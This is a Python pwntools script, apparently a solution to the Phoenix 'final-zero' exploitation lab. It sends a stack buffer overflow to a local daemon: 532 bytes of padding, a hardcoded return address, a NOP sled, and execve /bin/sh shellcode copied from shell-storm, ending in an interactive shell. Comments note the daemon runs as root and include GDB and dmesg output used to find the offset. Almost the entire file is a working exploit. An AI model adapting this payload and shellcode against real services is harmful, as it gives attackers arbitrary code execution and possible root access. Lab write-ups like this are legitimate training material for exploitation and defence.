#!/usr/bin/python

from pwn import *

p = remote("localhost", 64013)

def main():
	'''
	/etc/systemd/system
	Run daemon as root:
	
	[Service]
	Type=simple
	Restart=always
	#User=phoenix-i386-final-zero
	#User=phoenix-i386-final-zero
	User=root
	User=root
	'''

	# Skips prompt
	p.recvrepeat(0.2)

	# From GDB:
	#
	# Stopped reason: SIGSEGV
	# 0x41507341 in ?? ()
	#
	# gdb-peda$ pattern_offset 0x41507341
	# 1095791425 found at offset: 532

	log.info("Crafting payload")
	buf = "A" * 532

	# dmesg | tail -n 5
	# traps: final-zero[4587] general protection ip:ffffd844 sp:ffffdd80 error:0
	#
	# ret_addr = esp + 50

	ret_addr = 0xFFFFDDD4 # 0xffffdd80 + 50 
	nop_sled = '\x90' * 100

	#----------------#
	# 532 A(Junk) 	 #
	#----------------#
	# To mid nopsled #
	#----------------#
	# \x90 *100      #
	#----------------#
	# shellcode      #
	#----------------# 

	# http://shell-storm.org/shellcode/files/shellcode-841.php
	# Tiny execve sh shellcode	

	sh_code =  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
	sh_code += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
	sh_code += "\x80"

	buf += p32(ret_addr)
	buf += nop_sled
	buf += sh_code

	p.sendline(buf) # Sends payload

	log.warn("Payload sent!")

	p.interactive() # Pass interaction back to user

if __name__ == "__main__":
	main()
